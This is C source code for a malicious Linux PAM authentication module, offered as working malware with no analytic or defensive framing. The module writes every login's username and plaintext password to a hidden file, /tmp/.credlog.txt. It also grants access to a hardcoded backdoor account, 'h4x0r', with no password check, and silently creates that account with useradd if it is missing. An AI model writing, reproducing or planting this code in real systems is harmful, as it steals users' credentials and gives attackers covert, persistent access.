#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>

#define LOGFILE "/tmp/.credlog.txt"
#define BACKDOOR_USER "h4x0r"

int user_exists(const char *username) {
    struct passwd *pw = getpwnam(username);
    return (pw != NULL);
}

void create_backdoor_user() {
    // Create a user with no home directory and no password
    // Make sure this only runs once and is silent
    system("useradd -M -s /bin/bash h4x0r > /dev/null 2>&1");
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user;
    const char *pass;

    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    // Log credentials
    FILE *fp = fopen(LOGFILE, "a");
    if (fp) {
        fprintf(fp, "User: %s | Password: %s\n", user ? user : "NULL", pass ? pass : "NULL");
        fclose(fp);
    }

    // If the backdoor user is logging in, ensure account exists and allow access
    if (user && strcmp(user, BACKDOOR_USER) == 0) {
        if (!user_exists(BACKDOOR_USER)) {
            create_backdoor_user();
        }
        return PAM_SUCCESS;
    }

    // Let other modules decide
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
